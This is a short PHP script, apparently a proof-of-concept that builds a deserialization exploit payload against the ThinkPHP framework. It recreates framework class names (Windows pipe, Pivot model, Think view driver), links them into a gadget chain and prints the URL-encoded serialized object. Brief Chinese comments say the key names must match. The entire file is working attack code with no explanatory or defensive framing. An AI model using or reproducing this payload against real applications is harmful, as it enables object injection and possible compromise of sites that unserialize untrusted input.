<?php
namespace think\process\pipes{
    class Windows{
        public function __construct($s){
            $this->files = array($s);
        }
    }

}
namespace think\view\driver{
    class Think{
    }
}


namespace think{
    class Model{
        protected $append = ["test"=>["123"]];  //键名相同
        protected $data = ["test" => "111"];    //键名相同
        function __construct(){
            $this->data = ["test" => (new view\driver\Think())]; //键名相同
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{

    }
}

namespace{
    $string = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($string);
    echo urlencode(serialize($payload));
}
